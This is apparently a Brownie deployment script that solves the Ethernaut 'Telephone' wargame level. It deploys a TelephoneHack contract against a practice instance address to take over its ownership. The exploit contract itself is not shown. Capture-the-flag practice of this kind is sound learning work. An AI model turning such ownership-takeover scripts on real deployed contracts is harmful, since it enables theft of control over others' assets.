from brownie import TelephoneHack, Telephone
from scripts.challenge_utils import (
    connect_to_challenge, get_acc
)

ETHERNAUT_INSTANCE = '0xA51f7E8Fe70D54E61cf16763505F31aBeD0039ec'

def main():
    connect_to_challenge()
    acc = get_acc()
    contract = Telephone.at(ETHERNAUT_INSTANCE)
    TelephoneHack.deploy(ETHERNAUT_INSTANCE, {'from': acc})
    print(f'New owner: {contract.owner()}')
